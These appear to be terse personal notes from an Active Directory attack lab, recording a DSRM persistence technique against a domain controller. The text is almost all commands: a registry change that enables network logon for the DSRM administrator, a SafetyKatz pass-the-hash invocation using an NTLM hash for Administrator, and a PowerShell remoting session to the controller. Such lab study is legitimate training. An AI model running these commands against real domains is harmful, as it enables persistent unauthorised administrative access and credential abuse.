![Pasted image 20250621141455](../../../attchments/Pasted%20image%2020250621141455.png)




![Pasted image 20250621141624](../../../attchments/Pasted%20image%2020250621141624.png)

```
C:\Users\svcadmin>reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

above command is used to enable net logon to the dsrm account

![Pasted image 20250621141952](../../../attchments/Pasted%20image%2020250621141952.png)

```
C:\Windows\system32>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth/domain:dcorp-dc /
user:Administrator/ntlm:a102ad5753f4c441e3af31c
97fad86fd/run:cmd.exe" "exit"
```


![Pasted image 20250621142230](../../../attchments/Pasted%20image%2020250621142230.png)

![Pasted image 20250621142242](../../../attchments/Pasted%20image%2020250621142242.png)

```
Enter-PSSession -ComputerName
172.16.2.1
Authentication
NegotiateWithImplicitCredential
```

